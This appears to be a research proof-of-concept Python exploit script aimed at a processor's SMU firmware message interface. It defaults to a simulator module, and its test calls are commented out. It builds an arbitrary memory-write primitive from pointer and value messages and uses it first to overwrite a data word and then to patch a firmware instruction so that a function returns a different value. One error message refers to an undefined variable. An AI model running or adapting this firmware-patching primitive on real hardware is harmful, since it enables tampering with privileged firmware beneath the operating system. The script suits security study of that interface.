#!/usr/bin/env python

#import smu_real as smu         # for real hardware
import smu_sim as smu           # for testing

OFFSET_RAM = 0x0 # need to test if theres offsets
OFFSET_FUNC = 0x0 # need to test if theres offsets

MSG_TEST = 0x01
MSG_SET_VALUE = 0x28
MSG_SET_POINTER = 0x29
MSG_TEST_READ = 0x0B
MSG_TEST_FUNC = 0x03

def write(cmd, value = 0):
    status = smu.writesmu(cmd, value)
    if status != 1:
        raise ValueError(f"smu returned unexpected status {status}")

def read():
    return smu.readsmureg(smu.SMU_ARG_ADDR)

def modify_memory(addr, value):
    write(MSG_SET_POINTER, addr)
    write(MSG_SET_VALUE, value)

# Exploit Step 1: Check if smu interface is working correctly
def check_test_message():
    value = 123
    write(MSG_TEST, value)
    
    if read() != value + 1:
        raise ValueError(f"smu returned unexpected test value {response}, expected {value}")

    print("Test Message...OK")


# Exploit Step 2: Modify a memory value & try to read it back from the smu
# For reading back the memory we use q3_0x0B which returns the value "requested_by_q3_0x0B_DAT_0000ca4c_function_unknown" (addr 0xca4c)
# modifying this value should be safe as long as q3_0x3E isn't called (which shouldn't be the case)
# the memory region this value lives in should be writable
def check_modify_memory():
    write(MSG_TEST_READ) # read the initial value
    value = read()

    if value != 0:
        print("warning: requested_by_q3_0x0B_DAT_0000ca4c_function_unknown is not zero")

    modify_memory(OFFSET_RAM + 0xca4c, value + 4) # try to increase it by 4

    write(MSG_TEST_READ) # read the (hopefully) modified value 
    value_new = read()

    if value_new != value + 4:
        raise ValueError(f"failed to change memory value, was {value}, now is {value_new}")

    print("Modify Memory...OK")

# Exploit Step 3: Try to modify the instructions in a function
# For testing we use q3_0x03 which should always return 23
# the data at 1b930 is 02 1c 7b 25 which is interpreted as little endian: 0x257B1C02
# if we patch it to 0x258B1C02, q3_0x03 should yield 24 (0x18)
def check_modify_func():
    write(MSG_TEST_FUNC)
    value = read()

    if value != 23:
        raise ValueError("Failed to get return value 23 from q3_0x03")

    modify_memory(OFFSET_FUNC + 0x1B930, 0x258B1C02)
        
    write(MSG_TEST_FUNC)
    value_new = read()

    if value_new != 24:
        raise ValueError(f"Failed to modify function, got {value_new}, expected 24")

    print("Modify Function...OK")

    

# Uncomment these to do more tests

#check_test_message()
#check_modify_memory()
#check_modify_func() 
